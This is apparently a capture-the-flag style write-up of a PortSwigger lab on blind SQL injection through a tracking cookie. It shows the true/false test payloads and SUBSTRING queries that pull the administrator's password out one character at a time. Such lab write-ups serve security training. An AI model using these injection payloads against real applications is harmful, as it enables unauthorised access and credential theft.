
# Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Hint: You can assume that the password only contains lowercase, alphanumeric characters.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


There is a SQL injection in the cookie:



![img](images/Blind%20SQL%20injection%20with%20conditional%20responses/1.png)

The message “Welcome back!” appears with the payload:

```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='1;
```



![img](images/Blind%20SQL%20injection%20with%20conditional%20responses/2.png)

And it does not appear with:

```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='0;
```



![img](images/Blind%20SQL%20injection%20with%20conditional%20responses/3.png)

To test if the first letter of the password is “s” I will send:

```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='s
```

```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,1)='s
```

I sent it to the intruder and test the length sending all the letters including “s”:



![img](images/Blind%20SQL%20injection%20with%20conditional%20responses/4.png)

So we know the first letter of the administrator's password is “s” and we can test the second letter:

```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,2)='ss
```

```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,2)='ss
```



![img](images/Blind%20SQL%20injection%20with%20conditional%20responses/5.png)

It is better to update just the number of letter and test only one letter every time:

```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),3,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),4,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),5,1)='a
...
```

I continued until retrieving the password “ssmyivfjyj5m1bvch02g”.
